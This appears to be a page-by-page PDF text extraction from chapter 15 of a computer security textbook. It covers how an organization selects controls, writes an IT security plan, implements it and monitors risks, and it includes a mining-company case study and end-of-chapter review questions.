       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 518, 'page_label': '517'}, page_content='15.2 / SECURITY CONTROLS OR SAFEGUARDS  517\\nPhysical and Environmental Protection\\nPhysical and Environmental Protection Policy and Procedures, Physical Access Authorizations, Physical Access \\nControl, Access Control for Transmission Medium, Access Control for Output Devices, Monitoring Physical \\nAccess, Visitor Access Records, Power Equipment and Cabling, Emergency Shutoff, Emergency Power, Emer-\\ngency Lighting, Fire Protection, Temperature and Humidity Controls, Water Damage Protection, Delivery and \\nRemoval, Alternate Work Site, Location of Information System Components, Information Leakage, Asset \\nMonitoring and Tracking\\nPlanning\\nSecurity Planning Policy and Procedures, System Security Plan, Rules of Behavior, Security Concept of Opera-\\ntions, Information Security Architecture, Central Management\\nPersonnel Security\\nPersonnel Security Policy and Procedures, Position Risk Designation, Personnel Screening, Personnel Termina-\\ntion, Personnel Transfer, Access Agreements, Third-Party Personnel Security, Personnel Sanctions\\nRisk Assessment\\nRisk Assessment Policy and Procedures, Security Categorization, Risk Assessment, Vulnerability Scanning, \\nTechnical Surveillance Countermeasures Survey\\nSystem and Services Acquisition\\nSystem and Services Acquisition Policy and Procedures, Allocation of Resources, System Development Life \\nCycle, Acquisition Process, Information System Documentation, Security Engineering Principles, External \\nInformation System Services, Developer Configuration Management, Developer Security Testing and Evalu-\\nation, Supply Chain Protection, Trustworthiness, Criticality Analysis, Development Process, Standards, and \\nTools, Developer-Provided Training, Developer Security Architecture and Design, Tamper Resistance and \\nDetection, Component Authenticity, Customized Development of Critical Components, Developer Screening, \\nUnsupported System Components\\nSystem and Communications Protection\\nSystem and Communications Protection Policy and Procedures, Application Partitioning, Security Function \\nIsolation, Information in Shared Resources, Denial of Service Protection, Resource Availability, Boundary \\nProtection, Transmission Confidentiality and Integrity, Network Disconnect, Trusted Path, Cryptographic Key \\nEstablishment and Management, Cryptographic Protection, Collaborative Computing Devices, Transmission \\nof Security Attributes, Public Key Infrastructure Certificates, Mobile Code, Voice Over Internet Protocol, \\nSecure Name/Address Resolution Service (Authoritative Source, Recursive or Caching Resolver, Architecture \\nand Provisioning), Session Authenticity, Fail in Known State, Thin Nodes, Honeypots, Platform-Independent, \\nProtection of Information at Rest, Heterogeneity, Concealment and Misdirection, Covert Channel Analysis, \\nInformation System Partitioning, Nonmodifiable Executable Programs, Honeyclient, Distributed Processing \\nand Storage, Out-of-Band Channels, Operations Security, Process Isolation, Wireless Link Protection, Port and \\nI/O Device Access, Sensor Capability and Data, Usage Restrictions, Detonation Chambers\\nSystem and Information Integrity\\nSystem and Information Integrity Policy and Procedures, Flaw Remediation, Malicious Code Protection, \\nInformation System Monitoring, Security Alerts Advisories and Directives, Security Functionality Verification, \\nSoftware Firmware and Information Integrity, Spam Protection, Information Input Validation, Error Handling, \\nInformation Handling and Retention, Predictable Failure Prevention, Non-Persistence, Information Output \\nFiltering, Memory Protection, Fail-Safe Procedures\\nProgram Management\\nInformation Security Program Plan, Senior Information Security Officer, Information Security Resources, Plan \\nof Action and Milestones Process, Information System Inventory, Information Security Measures of  Performance, \\nEnterprise Architecture, Critical Infrastructure Plan, Risk Management Strategy, Security  Authorization Process, \\nMission/Business Process Definition, Insider Threat Program, Information Security Workforce, Testing Training \\nand Monitoring, Contacts with Security Groups and Associations, Threat Awareness Program\\nM15_STAL0611_04_GE_C15.indd   517 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 519, 'page_label': '518'}, page_content='518  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\nshould then be implemented across all the IT systems for the organization, with \\nadjustments in scope to address broad requirements of specific systems.\\nNIST SP 800-18 (Guide for Developing Security Plans for Federal Information \\nSystems, February 2006) suggests that adjustments may be needed for considerations \\nrelated to the following:\\n• Technology: Some controls are only applicable to specific technologies, and \\nhence these controls are only needed if the system includes those technologies. \\nExamples of these include wireless networks and the use of cryptography. Some \\nmay only be appropriate if the system supports the technology they require—\\nfor example, readers for access tokens. If these technologies are not supported \\non a system, then alternate controls, including administrative procedures or \\nphysical access controls, may be used instead.\\n• Common controls: The entire organization may be managed centrally and may \\nnot be the responsibility of the managers of a specific system. Control changes \\nwould need to be agreed to and managed centrally.\\n• Public access systems:  Some systems, such as the organization’s public Web \\nserver, are designed for access by the general public. Some controls, such as those \\nrelating to personnel security, identification, and authentication, would not apply \\nto access via the public interface. They would apply to administrative control of \\nsuch systems. The scope of application of such controls must be specified carefully.\\n• Infrastructure controls: Physical access or environmental controls are only rel-\\nevant to areas housing the relevant equipment.\\n• Scalability issues: Controls may vary in size and complexity in relation to the \\norganization employing them. For example, a contingency plan for systems criti-\\ncal to a large organization would be much larger and more detailed than that \\nfor a small business.\\n• Risk assessment: Controls may be adjusted according to the results of specific \\nrisk assessment of systems in the organization, as we now consider.\\nIf some form of informal or formal risk assessment process is being used, then \\nit provides guidance on specific risks to an organization’s IT systems that need to be \\naddressed. These will typically be some selection of operational or technical controls \\nthat together can reduce the likelihood of the identified risk occurring, the conse -\\nquences if it does, or both, to an acceptable level. These may be in addition to those \\ncontrols already selected in the baseline, or may simply be more detailed and careful \\nspecification and use of already selected controls.\\nThe process illustrated in Figure 15.1 indicates that a recommended list of controls \\nshould be made to address each risk needing treatment. The recommended controls \\nneed to be compatible with the organization’s systems and policies, and their selection \\nmay also be guided by legal requirements. The resulting list of controls should include \\ndetails of the feasibility and effectiveness of each control. The feasibility addresses fac-\\ntors such as technical compatibility with and operational impact on existing systems \\nand user’s likely acceptance of the control. The effectiveness equates the cost of imple-\\nmentation against the reduction in level of risk achieved by implementing the control.\\nThe reduction in level of risk that results from implementing a new or enhanced \\ncontrol results from the reduction in threat likelihood or consequence that the control \\nM15_STAL0611_04_GE_C15.indd   518 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 520, 'page_label': '519'}, page_content='15.2 / SECURITY CONTROLS OR SAFEGUARDS  519\\nprovides, as shown in Figure 15.3. The reduction in likelihood may result either by reduc-\\ning the vulnerabilities (flaws or weaknesses) in the system or by reducing the capability \\nand motivation of the threat source. The reduction in consequence occurs by reducing \\nthe magnitude of the adverse impact of the threat occurring in the organization.\\nThe organization will likely not have the resources to implement all the recom-\\nmended controls. Therefore, management should conduct a cost-benefit analysis to \\nidentify those controls that are most appropriate, and provide the greatest benefit \\nto the organization given the available resources. This analysis may be qualitative or \\nquantitative and must demonstrate that the cost of implementing a given control is \\njustified by the reduction in level of risk to assets that it provides. It should include \\ndetails of the impact of implementing the new or enhanced control, the impact of \\nnot implementing it, and the estimated costs of implementation. The analysis must \\nthen assess the implementation costs and benefits against system and data criticality \\nto determine the importance of choosing this control.\\nManagement must then determine which selection of controls provides an \\nacceptable resulting level of risk to the organization’s systems. This selection will \\nconsider factors such as the following:\\n• If the control would reduce risk more than needed, then a less expensive alter-\\nnative could be used.\\n• If the control would cost more than the risk reduction provided, then an alter-\\nnative should be used.\\n• If a control does not reduce the risk sufficiently, then either more or different \\ncontrols should be used.\\n• If the control provides sufficient risk reduction and is the most cost effective, \\nthen use it.\\nIt is often the case that the cost of implementing a control is more tangible and easily \\nspecified than the cost of not implementing it. Management must make a business \\ndecision regarding these ill-defined costs in choosing the final selection of controls \\nand resulting residual risk.\\nFigure 15.3 Residual Risk\\nReduce\\nnumber of\\nﬂaws or errors\\nAdd a targeted\\ncontrol\\nReduce\\nmagnitude\\nof impact\\nResidual\\nrisk\\nNew or\\nenhanced\\ncontrols\\nM15_STAL0611_04_GE_C15.indd   519 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 521, 'page_label': '520'}, page_content='520  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\n 15.3 IT SECURITY PLAN\\nHaving identified a range of possible controls from which management has selected \\nsome to implement, an IT security plan should then be created, as indicated in \\n Figures\\xa014.1 and 15.1. This is a document that provides details as to what will be \\ndone, what resources are needed, and who will be responsible. The goal is to detail the \\nactions needed to improve the identified deficiencies in the organization’s risk profile \\nin a timely manner. NIST SP 800-30 (Risk Management Guide for Information Tech-\\nnology Systems, September 2012) suggests that this plan should include details of:\\n• Risks (asset/threat/vulnerability combinations)\\n• Recommended controls (from the risk assessment)\\n• Action priority for each risk\\n• Selected controls (on the basis of the cost-benefit analysis)\\n• Required resources for implementing the selected controls\\n• Responsible personnel\\n• Target start and end dates for implementation\\n• Maintenance requirements and other comments\\nThese details are summarized in an implementation plan  table, such as that \\nshown in Table 15.4. This illustrates an example implementation plan for the example \\nrisk identified and shown in Table 14.5. The suggested controls are specific examples \\nof remote access, auditable event, user identification, system backup, and configura-\\ntion change controls, applied to the identified threatened asset. All of them are cho-\\nsen, because they are neither costly nor difficult to implement. They do require some \\nRisk  \\n(Asset/Threat)\\nHacker attack on Internet router\\nLevel of Risk High\\nRecommended \\nControls\\n• Disable external telnet access\\n• Use detailed auditing of privileged command use\\n• Set policy for strong admin passwords\\n• Set backup strategy for router configuration file\\n• Set change control policy for the router configuration\\nPriority High\\nSelected Controls •  Implement all recommended controls\\n• Update related procedures with training for affected staff\\nRequired \\nResources\\n• 3 days IT net admin time to change and verify router configuration, write policies\\n• 1 day of training for network administration staff\\nResponsible \\nPersons\\nJohn Doe, Lead Network System Administrator, Corporate IT Support Team\\nStart to End Date February 6, 2017 to February 9, 2017\\nOther Comments •  Need periodic test and review of configuration and policy use\\nTable 15.4 Implementation Plan\\nM15_STAL0611_04_GE_C15.indd   520 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 522, 'page_label': '521'}, page_content='15.4 / IMPLEMENTATION OF CONTROLS  521\\nchanges to procedures. The relevant network administration staff must be notified of \\nthese changes. Staff members may also require training on the correct implementa-\\ntion of the new procedures and their rights and responsibilities.\\n 15.4 IMPLEMENTATION OF CONTROLS\\nThe next phase in the IT security management process, as indicated in Figure 14.1, is \\nto manage the implementation of the controls detailed in the IT security plan. This \\ncomprises the do stage of the cyclic implementation model discussed in Chapter \\n14. The implementation phase comprises not only the direct implementation of the \\ncontrols as detailed in the security plan, but also the associated specific training and \\ngeneral security awareness programs for the organization.\\nImplementation of Security Plan\\nThe IT security plan  documents what needs to be done for each selected control, \\nalong with the personnel responsible, and the resources and time frame to be used. \\nThe identified personnel then undertake the tasks needed to implement the new or \\nenhanced controls, be they technical, managerial, or operational. This may involve \\nsome combination of system configuration changes, upgrades, or new system installa-\\ntion. It may also involve the development of new or extended procedures to document \\npractices needed to achieve the desired security goals. Note that even technical con-\\ntrols typically require associated operational procedures to ensure their correct use. \\nThe use of these procedures needs to be encouraged and monitored by management.\\nThe implementation process should be monitored to ensure its correctness. This \\nis typically performed by the organizational security officer, who checks that:\\n• The implementation costs and resources used stay within identified bounds.\\n• The controls are correctly implemented as specified in the plan, in order that \\nthe identified reduction in risk level is achieved.\\n• The controls are operated and administered as needed.\\nWhen the implementation is successfully completed, management needs to \\nauthorize the system for operational use. This may be a purely informal process \\nwithin the organization. Alternatively, especially in government organizations, this \\nmay be part of a formal process resulting in accreditation of the system as meeting \\nrequired standards. This is usually associated with the installation, certification, and \\nuse of trusted computing system, as we will discuss in Chapter 27 . In these cases, an \\nexternal accrediting body will verify the documented evidence of the correct design \\nand implementation of the system.\\nSecurity Awareness and Training\\nAppropriate security awareness training for all personnel in an organization, along \\nwith specific training relating to particular systems and controls, is an essential com-\\nponent in implementing controls. We will discuss these issues further in Chapter 17 , \\nwhere we explore policies related to personnel security.\\nM15_STAL0611_04_GE_C15.indd   521 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 523, 'page_label': '522'}, page_content='522  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\n 15.5 MONITORING RISKS\\nThe IT security management process does not end with the implementation of \\n controls and the training of personnel. As we noted in Chapter 14, it is a cyclic \\nprocess, constantly repeated to respond to changes in the IT systems and the risk \\n environment. The various controls implemented should be monitored to ensure their \\ncontinued effectiveness. Any proposed changes to systems should be checked for \\nsecurity implications and the risk profile of the affected system reviewed if  necessary. \\nUnfortunately, this aspect of IT security management often receives the least atten-\\ntion and in many cases is added as an afterthought, if at all. Failure to do so can \\ngreatly increase the likelihood that a security failure will occur. This follow-up stage \\nof the management process includes a number of aspects:\\n• Maintenance of security controls\\n• Security compliance checking\\n• Change and configuration management\\n• Incident handling\\nAny of these aspects might indicate that changes are needed to the previous stages in \\nthe IT security management process. An obvious example is that if a breach should \\noccur, such as a virus infection of desktop systems, then changes may be needed to \\nthe risk assessment, to the controls chosen, or to the details of their implementation. \\nThis can trigger a review of earlier stages in the process.\\nMaintenance\\nThe first aspect concerns the continued maintenance and monitoring of the imple -\\nmented controls to ensure their continued correct functioning and appropriateness. \\nIt is important that someone has responsibility for this maintenance process, which \\nis generally coordinated by the organization’s security officer. The maintenance tasks \\ninclude ensuring that:\\n• Controls are periodically reviewed to verify that they still function as intended.\\n• Controls are upgraded when new requirements are discovered.\\n• Changes to systems do not adversely affect the controls.\\n• New threats or vulnerabilities have not become known.\\nThis review includes regular analysis of log files to ensure various system components \\nare functioning as expected, and to determine a baseline of activity against which \\nabnormal events can be compared when handling incidents. We will discuss security \\nauditing further in Chapter 18.\\nThe goal of maintenance is to ensure that the controls continue to perform as \\nintended, and hence that the organization’s risk exposure remains as chosen. Failure \\nto maintain controls could lead to a security breach with a potentially significant \\nimpact on the organization.\\nM15_STAL0611_04_GE_C15.indd   522 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 524, 'page_label': '523'}, page_content='15.5 / MONITORING RISKS  523\\nSecurity Compliance\\nSecurity compliance checking is an audit process to review the organization’s security \\nprocesses. The goal is to verify compliance with the security plan. The audit may be \\nconducted using either internal or external personnel. It is generally based on the use \\nof checklists, which verify that the suitable policies and plans have been created, that \\nsuitable controls were chosen, and that the controls are maintained and used correctly.\\nThis audit process should be conducted on new IT systems and services once \\nthey are implemented; and on existing systems periodically, often as part of a wider, \\ngeneral audit of the organization or whenever changes are made to the organization’s \\nsecurity policy.\\nChange and Configuration Management\\nChange management is the process used to review proposed changes to systems for \\nimplications on the organization’s systems and use. Changes to existing systems can \\noccur for a number of reasons, such as the following:\\n• Users reporting problems or desired enhancements\\n• Identification of new threats or vulnerabilities\\n• Vendor notification of patches or upgrades to hardware or software\\n• Technology advances\\n• Implementation of new IT features or services, which require changing existing \\nsystems\\n• Identification of new tasks, which require changing existing systems\\nThe impact of any proposed change on the organization’s systems should be evalu -\\nated. This includes not only security-related aspects, but wider operational issues as \\nwell. Thus, change management is an important component of the general systems \\nadministration process. Because changes can affect security, this general process over-\\nlaps IT security management and must interact with it.\\nAn important example is the constant flow of patches addressing bugs and \\nsecurity failings in common operating systems and applications. If the organization is \\nrunning systems of any complexity, with a range of applications, then patches should \\nideally be tested to ensure that they don’t adversely affect other applications. This can \\nbe a time-consuming process that may require considerable administration resources, \\nand could leave the organization exposed to a new vulnerability for a period. Oth -\\nerwise, the patches or upgrades could be applied without testing, which may pos -\\nsibly result in other failures in the systems and the loss of functionality, but will also \\nimprove system security due to faster patching. Management need to decide whether \\navailability or security has higher priority in such cases.\\nIdeally, most proposed changes should act to improve the security profile of a \\nsystem. However, it is possible that for imperative business reasons, a change is pro-\\nposed that reduces the security of a system. In cases like this, it is important that the \\nreasons for the change, its consequences on the security profile for the organization, \\nand management authorization of it be documented. The benefits to the organization \\nwould need to be traded off against the increased risk level.\\nM15_STAL0611_04_GE_C15.indd   523 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 525, 'page_label': '524'}, page_content='524  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\nThe change management process may be informal or formal, depending on the \\nsize of the organization and its overall IT management processes. In a formal process, \\nany proposed change should be documented and tested before implementation. As \\npart of this process, any related documentation, including relevant security documen-\\ntation and procedures, should be updated to reflect the change.\\nConfiguration management is concerned with specifically keeping track of the \\nconfiguration of each system in use and the changes made to each. This includes lists \\nof the hardware and software versions installed on each system. This information is \\nneeded to help restore systems following a failure (whether security related or not) \\nand to know what patches or upgrades might be relevant to particular systems. Again, \\nthis is a general systems administration process with security implications and must \\ninteract with IT security management.\\nIncident Handling\\nThe procedures used to respond to a security incident comprise the final aspect \\nincluded in the follow-up stage of IT security management. This topic will be dis -\\ncussed further in Chapter 17 , where we explore policies related to human factors.\\n 15.6 CASE STUDY: SILVER STAR MINES\\nConsider the case study introduced in Chapter 14, which involves the operations of \\na fictional company Silver Star Mines. Given the outcome of the risk assessment for \\nthis company, the next stage in the security management process is to identify possi-\\nble controls. From the information provided during this assessment, clearly a number \\nof the possible controls listed in Table 15.3 are not being used. A comment repeated \\nmany times was that many of the systems in use had not been regularly upgraded, and \\npart of the reason for the identified risks was the potential for system compromise \\nusing a known but unpatched vulnerability. That clearly suggests that attention needs \\nto be given to controls relating to the regular, systematic maintenance of operating \\nsystems and applications software on server and client systems. Such controls include:\\n• Configuration management policy and procedures\\n• Baseline configuration\\n• System maintenance policy and procedures\\n• Periodic maintenance\\n• Flaw remediation\\n• Malicious code protection\\n• Spam and spyware protection\\nGiven that potential incidents are possible, attention should also be given to develop-\\ning contingency plans to detect and respond to such incidents and to enable speedy \\nrestoration of system function. Attention should be paid to controls such as:\\n• Audit monitoring, analysis, and reporting\\n• Audit reduction and report generation\\nM15_STAL0611_04_GE_C15.indd   524 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 526, 'page_label': '525'}, page_content='15.6 / CASE STUDY: SILVER STAR MINES  525\\n• Contingency planning policy and procedures\\n• Incident response policy and procedures\\n• Information system backup\\n• Information system recovery and reconstitution\\nThese controls are generally applicable to all the identified risks and constitute good \\ngeneral systems administration practice. Hence, their cost effectiveness would be \\nhigh because they provide an improved level of security across multiple identified \\nrisks.\\nNow consider the specific risk items. The top-priority risk relates to the reliabil-\\nity and integrity of the Supervisory Control and Data Acquisition (SCADA) nodes \\nand network. These were identified as being at risk because many of these systems are \\nrunning older releases of operating systems with known insecurities. Further, these \\nsystems cannot be patched or upgraded because the key applications they run have \\nnot been updated or validated to run on newer OS versions. Given these limitations \\non the ability to reduce the vulnerability of individual nodes, attention should be \\npaid to the firewall and application proxy servers that isolate the SCADA nodes and \\nnetwork from the wider corporate network. These systems can be regularly main -\\ntained and managed according to the generally applied list of controls we identified. \\nFurther, because the traffic to and from the SCADA network is highly structured and \\npredictable, it should be possible to implement an intrusion detection system with \\nmuch greater reliability than applies to general-use corporate networks. This system \\nshould be able to identify attack traffic, as it would be very different from normal \\ntraffic flows. Such a system might involve a more detailed, automated analysis of \\nthe audit records generated on the existing firewall and proxy server systems. More \\nlikely, it could be an independent system connected to and monitoring the traffic \\nthrough these systems. The system could be further extended to include an automated \\nresponse capability, which could automatically sever the network connection if an \\nattack is identified. This approach recognizes that the network connection is not \\nneeded for the correct operation of the SCADA nodes. Indeed, they were designed \\nto operate without such a network connection, which is much of the reason for their \\ninsecurity. All that would be lost is the improved overall monitoring and management \\nof the SCADA nodes. With this functionality, the likelihood of a successful attack, \\nalready regarded as very unlikely, can be further reduced.\\nThe second priority risk relates to the integrity of stored information. Clearly all \\nthe general controls help ameliorate this risk. More specifically, much of the problem \\nrelates to the large number of documents scattered over a large number of systems \\nwith inconsistent management. This risk would be easier to manage if all documents \\nidentified as critical to the operation of the company were stored on a smaller pool \\nof application and file servers. These could be managed appropriately using the gen-\\nerally applicable controls. This suggests that an audit of critical documents is needed \\nto identify who is responsible for them and where they are currently located. Then \\npolicies are needed that specify that critical documents should be created and stored \\nonly on approved central servers. Existing documents should be transferred to these \\nservers. Appropriate education and training of all affected users is needed to help \\nensure that these policies are followed.\\nM15_STAL0611_04_GE_C15.indd   525 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 527, 'page_label': '526'}, page_content='526  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\nThe next three risks relate to the availability or integrity of the key Financial, \\nProcurement, and Maintenance/Production systems. The generally applicable con -\\ntrols we identified should adequately address these risks once the controls are applied \\nto all relevant servers.\\nThe final risk relates to the availability, integrity, and confidentiality of e-mail. \\nAs was noted in the risk assessment, this is primarily the responsibility of the par -\\nent company’s IT group that manages the external mail gateway. There is a limited \\namount that can be done on the local site. The use of the generally applicable con -\\ntrols, particularly those relating to malicious code protection and spam and spyware \\nprotection on client systems, will assist in reducing this risk. In addition, as part of \\nthe contingency planning and incident response policies and procedures, consider -\\nation could be given to a backup e-mail system. For security, this system would use \\nclient systems isolated from the company intranet, connected to an external local \\nnetwork service provider. This connection would be used to provide limited e-mail \\ncapabilities for critical messages should the main company intranet e-mail system be \\ncompromised.\\nThis analysis of possible controls is summarized in Table 15.5, which lists the \\ncontrols identified and the priorities for their implementation. This table must \\nbe extended to include details of the resources required, responsible personnel, \\ntime frame, and any other comments. This plan would then be implemented, with \\nRisk (Asset/Threat)\\nLevel of \\nRisk Recommended Controls Priority\\nSelected \\nControls\\nAll risks (generally \\napplicable)\\n1. Configuration and periodic \\nmaintenance policy for servers\\n2. Malicious code (SPAM, spyware) \\nprevention\\n3. Audit monitoring, analysis, \\nreduction, and reporting on servers\\n4. Contingency planning and incident \\nresponse policies and procedures\\n5. System backup and recovery \\nprocedures\\n1 1.\\n2.\\n3.\\n4.\\n5.\\nReliability and integrity of \\nSCADA nodes and network\\nHigh 1. Intrusion detection and response \\nsystem\\n2 1.\\nIntegrity of stored file and \\ndatabase information\\nExtreme 1. Audit of critical documents\\n2. Document creation and storage \\npolicy\\n3. User security education and \\ntraining\\n3 1.\\n2.\\n3.\\nAvailability and integrity of \\nFinancial, Procurement, and \\nMaintenance/ Production \\nSystems\\nHigh — — (general \\ncontrols)\\nAvailability, integrity, and \\nconfidentiality of e-mail\\nHigh 1. Contingency planning—backup \\ne-mail service\\n4 1.\\nTable 15.5 Silver Star Mines—Implementation Plan\\nM15_STAL0611_04_GE_C15.indd   526 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 528, 'page_label': '527'}, page_content='15.7 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS  527\\nsuitable monitoring of its progress. Its successful implementation leads then to \\nlonger term follow-up, which should ensure that the new policies continue to be \\napplied appropriately and that regular reviews of the company’s security profile \\noccur. In time, this should lead to a new cycle of risk assessment, plan develop -\\nment, and follow-up.\\n 15.7 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nchange management\\nconfiguration management\\ncontrol\\ncountermeasure\\ndetection and recovery control\\nimplementation plan\\nIT security plan\\nmanagement control\\noperational control\\npreventative control\\nsafeguard\\nsecurity compliance\\nsupportive control\\ntechnical control\\nReview Questions\\n 15.1 Define security control or safeguard.\\n 15.2 List and briefly define the three br oad classes of controls and the three categories \\neach can include.\\n 15.3 List a specific example of each of the three broad classes of controls from those given \\nin Table 15.3.\\n 15.4 List and briefly discuss the requirements of a system for attaining an acceptance level \\nof security.\\n 15.5 List three ways that implementing a new or enhanced control can reduce the residual \\nlevel of risk.\\n 15.6 List the factors to be considered while selecting controls for cost-benefit analysis.\\n 15.7 List and briefly define the elements from the implementation of controls phase of IT \\nsecurity management.\\n 15.8 What is the main goal of security compliance checking pr ocess? When is such a pro-\\ncess conducted?\\n 15.9 Describe the significance of change management in a systems administration process. \\nIs it a formal process?\\n 15.10 What is the relation between change and configuration management as a general sys-\\ntems administration process, and an organization’s IT security risk management process?\\nProblems\\n 15.1 Consider the risk to “integrity of customer and financial data files on system” from \\n“corruption of these files due to import of a worm/virus onto system,” as discussed in \\nProblem 14.2. From the list shown in Table 15.3, select some suitable specific controls \\nthat could reduce this risk. Indicate which you believe would be most cost effective.\\n 15.2 Consider the risk to “confidentiality of medical records of patients stored on the hos-\\npital server” from “theft/breach of this confidential and sensitive information from \\nserver database,” as discussed in Problem 14.3. From the list shown in Table 15.3, select \\nsome suitable specific controls that could reduce this risk. Indicate which you believe \\nwould be most cost effective.\\nM15_STAL0611_04_GE_C15.indd   527 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 529, 'page_label': '528'}, page_content='528  CHAPTER 15 / IT SECURITY CONTROLS, PLANS, AND PROCEDURES\\n 15.3 Consider the risk to “integrity of the or ganization’s Web server” from “hacking and \\ndefacement of the Web server,” as discussed in Problem 14.4. From the list shown in \\nTable 15.3, select some suitable specific controls that could reduce this risk. Indicate \\nwhich you believe would be most cost effective.\\n 15.4 Consider the risk to “confidentiality of techniques for conducting penetration tests on \\ncustomers, and the results of these tests, which are stored on the server” from “ theft/\\nbreach of this confidential and sensitive information,” as discussed in Problem 14.5. \\nFrom the list shown in Table 15.3, select some suitable specific controls that could \\nreduce this risk. Indicate which you believe would be most cost effective.\\n 15.5 Consider the risk to “confidentiality of personnel information in a copy of a database \\nstored 